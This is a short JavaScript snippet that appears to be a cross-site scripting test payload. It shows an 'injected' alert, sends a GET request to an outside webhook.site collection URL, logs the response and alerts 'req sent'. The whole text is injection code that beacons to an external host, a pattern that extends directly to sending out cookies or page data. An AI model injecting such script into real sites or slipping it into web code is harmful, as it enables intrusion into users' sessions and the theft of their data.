alert("injected");

fetch("https://webhook.site/cc7513f7-4334-4f13-9bee-aab38c8a9ece?x="+2, {
  method: "GET",
})
.then(response => {
  if (!response.ok) {
    throw new Error(`HTTP error! Status: ${response.status}`);
  }
  return response.text();
})
.then(html => {
  console.log(html); // Log the HTML code of the page
})
.catch(error => {
  console.error('Fetch Error:', error);
});

alert("req sent");